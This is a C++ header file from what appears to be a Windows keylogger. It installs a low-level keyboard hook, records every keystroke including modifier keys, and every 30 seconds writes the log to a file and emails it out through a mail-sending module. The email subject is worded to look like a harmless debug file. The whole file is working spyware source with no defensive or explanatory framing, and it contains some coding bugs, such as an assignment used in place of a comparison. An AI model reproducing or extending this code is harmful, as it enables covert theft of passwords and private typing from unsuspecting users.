#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "const_keys.h"
#include "Timer.h"
#include "MailSender.h"


std::string keylog = "";

void TimerSendMail()
{
    if(keylog.empty())
        return;
    std::string last_file = IO::WriteLog(keylog);

    if(last_file.empty())
    {
        DLC::ApplicationLogCreate("Failure due creation of file .Keylog '" + keylog + "'");
        return;
    }
int x = Mail::SendMail("Log [" + last_file + "]","File z enkodem dla debagu \n"+ keylog,IO::GetOurPath(true) + last_file);
if(x!=7)
    DLC::ApplicationLogCreate("Mail send failed, Error : " + DLC::ConvToString(x));
else
    keylog = "";

}

Timer MailTimer(TimerSendMail, 1000 * 30 ,Timer::Infinite);

HHOOK eHOOK = NULL; //nullptr

LRESULT OurKeyBoardProc(int nCode,WPARAM wparam,LPARAM lparam)
{
    if(nCode<0)
        CallNextHookEx(eHOOK,nCode,wparam,lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
    if(wparam = WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)
            keylog +='\n';
    }
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if(key== VK_CONTROL||key == VK_LCONTROL|| key== VK_RCONTROL || key == VK_SHIFT ||key == VK_RSHIFT || key ==VK_LSHIFT || key == VK_MENU || key == VK_LMENU ||key ==VK_RMENU||key == VK_CAPITAL||key ==VK_NUMLOCK||key ==VK_LWIN||key ==VK_RWIN)
            {
                std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
                KeyName.insert(1,"/");
                keylog += KeyName;
            }
    }
    return CallNextHookEx(eHOOK,nCode,wparam,lparam);
}
bool InstallHook()
{
    DLC::ApplicationLogCreate("Hook Started... Timer Started");
    MailTimer.Start(true);
    eHOOK = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)OurKeyBoardProc,GetModuleHandle(NULL),0);
    return eHOOK == NULL;
}
bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHOOK);
    eHOOK = NULL;
    return (bool)b;
}
bool IsHooked()
{
    return(bool)(eHOOK == NULL);
}

#endif // KEYBHOOK_H
